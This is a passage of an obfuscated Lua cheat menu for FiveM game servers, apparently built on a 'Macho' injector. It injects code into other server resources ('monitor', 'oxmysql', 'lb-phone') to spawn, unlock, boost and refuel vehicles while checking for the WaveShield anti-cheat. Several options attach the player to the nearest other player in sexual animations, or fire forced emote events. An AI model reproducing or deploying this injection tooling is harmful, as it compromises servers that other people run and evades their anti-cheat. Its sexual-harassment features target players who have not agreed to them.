            GxRpVuNzYiTq = true

            local function jqX7TvYzWq()
                local WvBnMpLsQzTx = GetGameTimer
                local VcZoPwLsEkRn = math.floor
                local DfHkLtQwAzCx = math.sin
                local PlJoQwErTgYs = CreateThread
                local MzLxVoKsUyNz = GetVehiclePedIsIn
                local EyUiNkOpLtRg = PlayerPedId
                local KxFwEmTrZpYq = DoesEntityExist
                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

                local yGfTzLkRn = 1.0

                local function HrCvWbXuNz(freq)
                    local color = {}
                    local t = WvBnMpLsQzTx() / 1000
                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                    return color
                end

                PlJoQwErTgYs(function()
                    while GxRpVuNzYiTq and not Unloaded do
                        local ped = EyUiNkOpLtRg()
                        local veh = MzLxVoKsUyNz(ped, false)
                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                        end
                        Wait(0)
                    end
                end)
            end

            jqX7TvYzWq()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            GxRpVuNzYiTq = false
        ]]);end);MachoMenuCheckbox(v43[2 -1 ],"Drift Mode (Hold Shift)",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
            MqTwErYuIoLp = true

            local function PlRtXqJm92()
                local XtFgDsQwAzLp = CreateThread
                local UiOpAsDfGhKl = PlayerPedId
                local JkHgFdSaPlMn = GetVehiclePedIsIn
                local WqErTyUiOpAs = IsControlPressed
                local AsZxCvBnMaSd = DoesEntityExist
                local KdJfGvBhNtMq = SetVehicleReduceGrip

                XtFgDsQwAzLp(function()
                    while MqTwErYuIoLp and not Unloaded do
                        Wait(0)
                        local ped = UiOpAsDfGhKl()
                        local veh = JkHgFdSaPlMn(ped, false)
                        if veh ~= 0 and AsZxCvBnMaSd(veh) then
                            if WqErTyUiOpAs(0, 21) then
                                KdJfGvBhNtMq(veh, true)
                            else
                                KdJfGvBhNtMq(veh, false)
                            end
                        end
                    end
                end)
            end

            PlRtXqJm92()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            MqTwErYuIoLp = false
            local ZtQwErTyUiOp = PlayerPedId
            local DfGhJkLzXcVb = GetVehiclePedIsIn
            local VbNmAsDfGhJk = DoesEntityExist
            local NlJkHgFdSaPl = SetVehicleReduceGrip

            local ped = ZtQwErTyUiOp()
            local veh = DfGhJkLzXcVb(ped, false)
            if veh ~= 0 and VbNmAsDfGhJk(veh) then
                NlJkHgFdSaPl(veh, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Easy Handling",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
            NvGhJkLpOiUy = true

            local function KbZwVoYtLx()
                local BtGhYtUlOpLk = CreateThread
                local WeRtYuIoPlMn = PlayerPedId
                local TyUiOpAsDfGh = GetVehiclePedIsIn
                local UyTrBnMvCxZl = SetVehicleGravityAmount
                local PlMnBvCxZaSd = SetVehicleStrong

                BtGhYtUlOpLk(function()
                    while NvGhJkLpOiUy and not Unloaded do
                        local ped = WeRtYuIoPlMn()
                        local veh = TyUiOpAsDfGh(ped, false)
                        if veh and veh ~= 0 then
                            UyTrBnMvCxZl(veh, 73.0)
                            PlMnBvCxZaSd(veh, true)
                        end
                        Wait(0)
                    end

                    local ped = WeRtYuIoPlMn()
                    local veh = TyUiOpAsDfGh(ped, false)
                    if veh and veh ~= 0 then
                        UyTrBnMvCxZl(veh, 9.8)
                        PlMnBvCxZaSd(veh, false)
                    end
                end)
            end

            KbZwVoYtLx()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NvGhJkLpOiUy = false
            local UyTrBnMvCxZl = SetVehicleGravityAmount
            local PlMnBvCxZaSd = SetVehicleStrong
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh and veh ~= 0 then
                UyTrBnMvCxZl(veh, 9.8)
                PlMnBvCxZaSd(veh, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1],"Shift Boost",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
            QwErTyUiOpSh = true

            local function ZxCvBnMmLl()
                local aAaBbCcDdEe = CreateThread
                local fFfGgGgHhIi = Wait
                local jJkKlLmMnNo = PlayerPedId
                local pPqQrRsStTu = IsPedInAnyVehicle
                local vVwWxXyYzZa = GetVehiclePedIsIn
                local bBcCdDeEfFg = IsDisabledControlJustPressed
                local sSeEtTvVbBn = SetVehicleForwardSpeed

                aAaBbCcDdEe(function()
                    while QwErTyUiOpSh and not Unloaded do
                        local _ped = jJkKlLmMnNo()
                        if pPqQrRsStTu(_ped, false) then
                            local _veh = vVwWxXyYzZa(_ped, false)
                            if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                                sSeEtTvVbBn(_veh, 150.0)
                            end
                        end
                        fFfGgGgHhIi(0)
                    end
                end)
            end

            ZxCvBnMmLl()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            QwErTyUiOpSh = false
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Instant Breaks",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
            VkLpOiUyTrEq = true

            local function YgT7FrqXcN()
                local ZxSeRtYhUiOp = CreateThread
                local LkJhGfDsAzXv = PlayerPedId
                local PoLkJhBgVfCd = GetVehiclePedIsIn
                local ErTyUiOpAsDf = IsDisabledControlPressed
                local GtHyJuKoLpMi = IsPedInAnyVehicle
                local VbNmQwErTyUi = SetVehicleForwardSpeed

                ZxSeRtYhUiOp(function()
                    while VkLpOiUyTrEq and not Unloaded do
                        local ped = LkJhGfDsAzXv()
                        local veh = PoLkJhBgVfCd(ped, false)
                        if veh and veh ~= 0 then
                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                VbNmQwErTyUi(veh, 0.0)
                            end
                        end
                        Wait(0)
                    end
                end)
            end

            YgT7FrqXcN()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            VkLpOiUyTrEq = false
        ]]);end);MachoMenuCheckbox(v43[1],"Unlimited Fuel",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
            BlNkJmLzXcVb = true

            local function LqWyXpR3tV()
                local TmPlKoMiJnBg = CreateThread
                local ZxCvBnMaSdFg = PlayerPedId
                local YhUjIkOlPlMn = IsPedInAnyVehicle
                local VcXzQwErTyUi = GetVehiclePedIsIn
                local KpLoMkNjBhGt = DoesEntityExist
                local JkLzXcVbNmAs = SetVehicleFuelLevel

                TmPlKoMiJnBg(function()
                    while BlNkJmLzXcVb and not Unloaded do
                        local ped = ZxCvBnMaSdFg()
                        if YhUjIkOlPlMn(ped, false) then
                            local veh = VcXzQwErTyUi(ped, false)
                            if KpLoMkNjBhGt(veh) then
                                JkLzXcVbNmAs(veh, 100.0)
                            end
                        end
                        Wait(100)
                    end
                end)
            end

            LqWyXpR3tV()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            BlNkJmLzXcVb = false
        ]]);end);local v56=MachoMenuInputbox(v43[2 + 0 ],"License Plate:","...");MachoMenuButton(v43[2],"Set License Plate",function() local v205=MachoMenuGetInputbox(v56);if ((type(v205)=="string") and (v205~="")) then local v290=0;local v291;while true do if (v290==(1096 -(709 + 387))) then v291=string.format([[
                local function xKqLZVwPt9()
                    local XcVbNmAsDfGhJkL = PlayerPedId
                    local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                    local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                    local pEd = XcVbNmAsDfGhJkL()
                    local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                    if vEh and vEh ~= 0 then
                        PoIuYtReWqAzXsDc(vEh, "%s")
                    end

                end

                xKqLZVwPt9()
            ]],v205);MachoInjectResource((v48("monitor") and "monitor") or "any" ,v291);break;end end end end);local v57=MachoMenuInputbox(v43[2],"Vehicle Model:","...");MachoMenuButton(v43[1860 -(673 + 1185) ],"Spawn Car",function() local v206=0;local v207;local v208;local v209;local v210;while true do if (v206==(0 -0)) then v207=MachoMenuGetInputbox(v57);v208=GetResourceState("WaveShield")=="started" ;v206=3 -2 ;end if (v206==(1 -0)) then v209=GetResourceState("lb-phone")=="started" ;v210=nil;v206=2 + 0 ;end if (v206==(2 + 0)) then if ( not v208 and v209) then v210=([[ 
                if type(CreateFrameworkVehicle) == "function" then
                    local model = "%s"
                    local hash = GetHashKey(model)
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then
                        local coords = GetEntityCoords(ped)
                        if coords then
                            local vehicleData = {
                                vehicle = json.encode({ model = model })
                            }
                            CreateFrameworkVehicle(vehicleData, coords)
                        end
                    end
                end
            ]]):format(v207);MachoInjectResource("lb-phone",v210);else v210=([[ 
                local function XzRtVbNmQwEr()
                    local tYaPlXcUvBn = PlayerPedId
                    local iKoMzNbHgTr = GetEntityCoords
                    local wErTyUiOpAs = GetEntityHeading
                    local hGtRfEdCvBg = RequestModel
                    local bNjMkLoIpUh = HasModelLoaded
                    local pLkJhGfDsAq = Wait
                    local sXcVbNmZlQw = GetVehiclePedIsIn
                    local yUiOpAsDfGh = DeleteVehicle
                    local aSxDcFgHvBn = _G.CreateVehicle
                    local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                    local zMxNaLoKvRe = SetEntityAsMissionEntity
                    local mVbGtRfEdCv = SetVehicleOutOfControl
                    local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                    local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                    local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                    local vBtNrEuPwOa = SetNetworkIdCanMigrate
                    local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                    local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                    local bPeDrTfGyHu = tYaPlXcUvBn()
                    local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                    local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                    local nMiLoPzXwEq = "%s"

                    hGtRfEdCvBg(nMiLoPzXwEq)
                    while not bNjMkLoIpUh(nMiLoPzXwEq) do
                        pLkJhGfDsAq(100)
                    end

                    local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                    if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                        yUiOpAsDfGh(fVbGtFrEdSw)
                    end

                    local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                    local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                    zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                    mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                    eDsFgHjKlQw(xFrEdCvBgTn, false)
                    lAzSdXfCvBg(sMnLoKiJpUb, true)
                    nMqWlAzXcVb(xFrEdCvBgTn, false)
                    vBtNrEuPwOa(sMnLoKiJpUb, true)
                    gHrTyUjLoPk(nMiLoPzXwEq)

                    kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
                end

                XzRtVbNmQwEr()
            ]]):format(v207);MachoInjectResource((v48("monitor") and "monitor") or "any" ,v210);end break;end end end);MachoMenuButton(v43[3],"Repair Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function FgN7LqxZyP()
                local aBcD = PlayerPedId
                local eFgH = GetVehiclePedIsIn
                local iJkL = SetVehicleFixed
                local mNoP = SetVehicleDeformationFixed

                local p = aBcD()
                local v = eFgH(p, false)
                if v and v ~= 0 then
                    iJkL(v)
                    mNoP(v)
                end
            end

            FgN7LqxZyP()
        ]]);end);MachoMenuButton(v43[3 -0 ],"Flip Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function vXmYLT9pq2()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetEntityHeading
                local d = SetEntityRotation

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    d(veh, 0.0, 0.0, c(veh))
                end
            end

            vXmYLT9pq2()
        ]]);end);MachoMenuButton(v43[1 + 2 ],"Clean Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qPwRYKz7mL()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = SetVehicleDirtLevel

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    c(veh, 0.0)
                end
            end

            qPwRYKz7mL()
        ]]);end);MachoMenuButton(v43[5 -2 ],"Delete Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function LXpTqWvR80()
                local aQw = PlayerPedId
                local bEr = GetVehiclePedIsIn
                local cTy = DoesEntityExist
                local dUi = NetworkHasControlOfEntity
                local eOp = SetEntityAsMissionEntity
                local fAs = DeleteEntity
                local gDf = DeleteVehicle
                local hJk = SetVehicleHasBeenOwnedByPlayer

                local ped = aQw()
                local veh = bEr(ped, false)

                if veh and veh ~= 0 and cTy(veh) then
                    hJk(veh, true)
                    eOp(veh, true, true)

                    if dUi(veh) then
                        fAs(veh)
                        gDf(veh)
                    end
                end

            end

            LXpTqWvR80()
        ]]);end);MachoMenuButton(v43[5 -2 ],"Toggle Vehicle Engine",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function NKzqVoXYLm()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetIsVehicleEngineRunning
                local d = SetVehicleEngineOn

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    if c(veh) then
                        d(veh, false, true, true)
                    else
                        d(veh, true, true, false)
                    end
                end
            end

            NKzqVoXYLm()
        ]]);end);MachoMenuButton(v43[3],"Max Vehicle Upgrades",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function XzPmLqRnWyBtVkGhQe()
                local FnUhIpOyLkTrEzSd = PlayerPedId
                local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                local RfDsHuNjMaLpOyBt = SetVehicleModKit
                local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                local QwErTyUiOpAsDfGh = SetVehicleMod
                local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                local UjMiKoLpNwAzSdFg = SetVehicleExtra
                local RvTgYhNuMjIkLoPb = DoesExtraExist

                local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                for XyZoPqRtWnEsDfGh = 0, 16 do
                    local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                    if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                    end
                end

                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                end

                for QeTrBnMkOjHuYgFv = 17, 22 do
                    ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                end

                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                for TpYuIoPlMnBvCxZq = 1, 12 do
                    if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                        UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                    end
                end

                MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
            end

            XzPmLqRnWyBtVkGhQe()
        ]]);end);MachoMenuButton(v43[3],"Teleport into Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function uPKcoBaEHmnK()
                local ziCFzHyzxaLX = SetPedIntoVehicle
                local YPPvDlOGBghA = GetClosestVehicle

                local Coords = GetEntityCoords(PlayerPedId())
                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                    else
                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                    end
                end
            end

            uPKcoBaEHmnK()
        ]]);end);MachoMenuButton(v43[3],"Unlock Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function TpLMqKtXwZ()
                local AsoYuTrBnMvCxZaQw = PlayerPedId
                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                local ped = AsoYuTrBnMvCxZaQw()
                local coords = GhrTnLpKjUyVbMnZx(ped)
                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                    VczNmLoJhBgVfCdEx(veh, true, true)
                    RtYuIoPlMnBvCxZaSd(veh, true)
                    EqWoXyBkVsNzQuH(veh, 1)
                    YxZwQvTrBnMaSdFgHj(veh, false)
                end

            end

            TpLMqKtXwZ()
        ]]);end);MachoMenuButton(v43[3],"Lock Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function tRYpZvKLxQ()
                local WqEoXyBkVsNzQuH = PlayerPedId
                local LoKjBtWxFhPoZuR = GetEntityCoords
                local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
                local TyUiOpAsDfGhJkLzXc = DoesEntityExist
                local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
                local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
                local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
                local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
                local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

                local ped = WqEoXyBkVsNzQuH()
                local coords = LoKjBtWxFhPoZuR(ped)
                local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

                if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                    PlMnBvCxZaSdFgTrEq(veh, true, true)
                    KjBtWxFhPoZuRZlK(veh, true)
                    AsDfGhJkLzXcVbNmQwE(veh, 2)
                    QwEoXyBkVsNzQuHL(veh, true)
                end
            end

            tRYpZvKLxQ()
        ]]);end);MachoMenuButton(v44[1],"Force Emotes [Be careful]",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            Citizen.CreateThread(function()
        local playerPed = PlayerPedId()
        local playerId = GetPlayerServerId(PlayerId())

        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    end)
        ]]);end);MachoMenuButton(v44[1881 -(446 + 1434) ],"Detach All Entitys",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zXqLJWt7pN()
                local xPvA71LtqzW = ClearPedTasks
                local bXcT2mpqR9f = DetachEntity

                xPvA71LtqzW(PlayerPedId())
                bXcT2mpqR9f(PlayerPedId())
            end

            zXqLJWt7pN()
        ]]);end);MachoMenuButton(v44[1],"Twerk On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function OyWTpKvmXq()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                
                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)
                        
                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkDaddy then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkDaddy = false
                    else
                        StarkDaddy = true
                        if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                            RequestAnimDict("switch@trevor@mocks_lapdance")
                            while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                                Wait(0)
                            end        
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            OyWTpKvmXq()
        ]]);end);MachoMenuButton(v44[1284 -(1040 + 243) ],"Give Them Backshots",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function bXzLqPTMn9()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkDaddy then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkDaddy = false
                    else
                        StarkDaddy = true
                        if not HasAnimDictLoaded("rcmpaparazzo_2") then
                            RequestAnimDict("rcmpaparazzo_2")
                            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    end
                end
            end

            bXzLqPTMn9()
        ]]);end);MachoMenuButton(v44[2 -1 ],"Wank On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qXW7YpLtKv()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if isInPiggyBack then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        wankoffperson = false
                    else
                        wankoffperson = true
                        if not HasAnimDictLoaded("mp_player_int_upperwank") then
                            RequestAnimDict("mp_player_int_upperwank")
                            while not HasAnimDictLoaded("mp_player_int_upperwank") do
                                Wait(0)
                            end
                        end
                    end

                    TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
                end
            end

            qXW7YpLtKv()
        ]]);end);MachoMenuButton(v44[1],"Piggyback On Player",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function RtKpqLmXZV()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if isInPiggyBack then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        isInPiggyBack = false
                    else
                        isInPiggyBack = true
                        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                    end
                end
            end

            RtKpqLmXZV()
